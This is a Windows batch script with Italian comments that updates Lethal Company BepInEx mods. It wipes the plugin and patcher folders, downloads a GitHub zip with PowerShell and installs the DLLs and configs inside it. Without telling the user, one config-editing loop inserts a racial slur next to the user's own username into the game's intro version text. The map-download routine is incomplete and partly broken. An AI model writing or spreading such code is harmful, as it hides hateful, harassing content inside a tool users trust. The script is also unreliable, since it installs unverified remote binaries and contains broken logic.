@echo off
setlocal EnableDelayedExpansion
echo Benvenuto %USERNAME%
echo Script ModUpdater V2.1 by Killer
echo Questo Script cancellera' tutte le mod e scarichera' quelle Nuove
echo Inizializzazione Script, Potrebbe volerci un po'...

REM Passo gli argomenti
set potatoOrNot=%1
set debugOrNot=%2

REM Specifica la parte finale del percorso desiderato
set "parteFinalePercorso=\Lethal Company\BepInEx"

REM Verifica se la parte finale del percorso è presente nel percorso corrente
set "percorsoCorrente=%CD%"
set "ultimaPartePercorso=!CD:~-23!"
if /I "!ultimaPartePercorso!" equ "!parteFinalePercorso!" (
    del "..\discord_game_sdk.dll" >NUL 2>&1
    REM Elimina tutti i file cartelle e sottocartelle nella cartella corrente
    set "nomeFileScript=%~n0%~x0"
    FOR /d %%a IN (".\plugins\*") DO RD /S /Q "%%a"
    FOR %%a IN (".\plugins\*") DO IF /i NOT "%%~nxa"=="%nomeFileScript%" DEL "%%a"
    
    REM Elimina tutti i file cartelle e sottocartelle nella directory con le librerie
    for %%i in (".\patchers\*.*") do (
        del /q "%%i" >NUL 2>&1
    )
    for /d %%i in (".\patchers\*") do (
        rmdir /s /q "%%i" >NUL 2>&1
    )

    REM Scarica la zip dalla repository e la estrae utilizzando PowerShell poi elimina la zip
    powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/V1p3r5-5/BlueCrewMods/archive/refs/tags/main.zip', 'BlueCrewMods.zip')"
    powershell -Command "& { Expand-Archive -Path 'BlueCrewMods.zip' -DestinationPath '.' -Force }"
    del "BlueCrewMods.zip" >NUL 2>&1

    REM Aggiunge la librerie necessarie
    xcopy ".\BlueCrewMods-main\Patcher\" ".\patchers\" /T /I >NUL 2>&1
    mkdir ".\patchers\BepInEx.MonoMod.HookGenPatcher" >NUL 2>&1

    REM Cancella HD mod Per i PotatoPC se viene passato l'argomento
    if /I "%potatoOrNot%" equ "potato" (
        del /Q ".\BlueCrewMods-main\Plugin\HDLethalCompany.dll" >NUL 2>&1
        del /Q ".\BlueCrewMods-main\Config\HDLethalCompany.cfg" >NUL 2>&1
        rd /s /q  ".\BlueCrewMods-main\PluginFolder\HDLethalCompany" >NUL 2>&1
    )

    REM Aggiunge i plugin e le librerie necessarie necessari
    xcopy ".\BlueCrewMods-main\Plugin\*" ".\plugins\" /E /I /Y >NUL 2>&1
    xcopy ".\BlueCrewMods-main\PluginFolder\*" ".\plugins\" /E /I /Y >NUL 2>&1
    xcopy ".\BlueCrewMods-main\Patcher\*" ".\patchers\" /E /I /Y >NUL 2>&1

    REM Aggiunge i file di config
    for /r ".\BlueCrewMods-main\Config" %%x in (*.cfg) do move "%%x" ".\config" >NUL 2>&1

    REM EDIT CONFIG IF POTATO
    if /I "%potatoOrNot%" equ "potato" (
        (
        echo ## Settings file was created by plugin MirrorDecor v1.2.2 and Edited for PotatoPC
        echo ## Plugin GUID: quackandcheese.mirrordecor
        echo [Mirror]
        echo MirrorEnabled = true
        echo MirrorPrice = 0
        echo AlwaysAvailable = true
        echo MirrorResolution = 200
        )>"quackandcheese.mirrordecor.cfg"
        move ".\quackandcheese.mirrordecor.cfg" ".\config\quackandcheese.mirrordecor.cfg" >NUL 2>&1
    )
    REM EDIT CONFIG
    for /F "delims=" %%a in ('type ".\config\io.github.IntroTweaks.cfg"') do (
        set "line=%%a"
        set "line=!line:###############=sVersionText = v$VERSION\n[%USERNAME% is a NIGGER]!"
        echo !line! >> ".\config\io.github.IntroTweaks.cfg.tmp"
    )
    move /y ".\config\io.github.IntroTweaks.cfg.tmp" ".\config\io.github.IntroTweaks.cfg" >NUL 2>&1

    REM Finito elimino la directory della repo
    rd /s /q "BlueCrewMods-main" >NUL 2>&1

    set "egyptVers=egypt204"
    REM Controllo mappe installate
    if exist ".\maps\" (
        if exist ".\maps\egypt\" (
            if exist ".\maps\egypt\%egyptVers%.zip" (
                echo Mappa Egypt gia' all'ultima versione
            ) else (
                echo Mappa Egypt da aggiornare...
                
                call downloadMaps
            )
        )
        REM Scarico tutte le mappe
        echo "aa"
    )

    echo Mod Aggiornate con successo.
    exit /b 0

) else (
    echo Non sei nella directory giusta
    exit /b 1
)

exit /b 2

:downloadMaps
REM Scarico la mappa
if "%currentMapToDL%" equ "egypt" (
    curl "https://thunderstore.io/package/download/KayNetsua/E_Gypt_Moon/2.0.4/" --output "%egyptVers%.zip"
    powershell -Command "& { Expand-Archive -Path '%egyptVers%.zip' -DestinationPath '.' -Force }"
    move ".\" ".\maps\egypt\egypt.lethalbundle" >NUL 2>&1
) else if "%currentMapToDL%" equ "" (

) else if "%currentMapToDL%" equ "" (
    
)